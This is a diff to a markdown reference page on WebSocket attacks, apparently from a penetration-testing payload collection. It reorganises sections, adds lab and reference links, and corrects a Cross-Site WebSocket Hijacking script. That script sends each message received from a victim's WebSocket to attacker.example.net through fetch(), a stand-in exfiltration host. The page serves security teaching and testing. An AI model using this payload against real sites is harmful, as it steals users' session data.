@@ -1,17 +1,23 @@
-# Web Sockets Attacks
+# Web Sockets
 
 > The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server
 
 ## Summary
 
 * [Tools](#tools)
-* [Using ws-harness.py](#using-ws-harness-py)
+* [Exploit](#exploit)
+  * [Using ws-harness.py](#using-ws-harness-py)
+* [Cross-Site WebSocket Hijacking (CSWSH)](#cross-site-websocket-hijacking-cswsh)
+* [Labs](#labs)
+* [References](#references)
 
 ## Tools
 
 * [ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)
 
-## Using ws-harness.py
+## Exploit
+
+### Using ws-harness.py
 
 Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint.
 
@@ -45,7 +51,7 @@ data from the WebSocket to the attacker:
 <script>
   ws = new WebSocket('wss://vulnerable.example.com/messages');
   ws.onopen = function start(event) {
-    websocket.send("HELLO");
+    ws.send("HELLO");
   }
   ws.onmessage = function handleReply(event) {
     fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
@@ -59,8 +65,13 @@ application uses a `Sec-WebSocket-Protocol` header in the handshake request,
 you have to add this value as a 2nd parameter to the `WebSocket` function call
 in order to add this header.
 
+## Labs
+
+* [PortSwigger Labs for Web Sockets](https://portswigger.net/web-security/all-labs#http-request-smuggling)
+
 ## References
 
-- [HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019](https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
+- [HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
 - [Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
 - [Mini WebSocket CTF - January 27, 2020 - Snowscan](https://snowscan.io/bbsctf-evilconneck/#)
+- [Hacktricks - CSWSH](https://book.hacktricks.xyz/pentesting-web/cross-site-websocket-hijacking-cswsh)
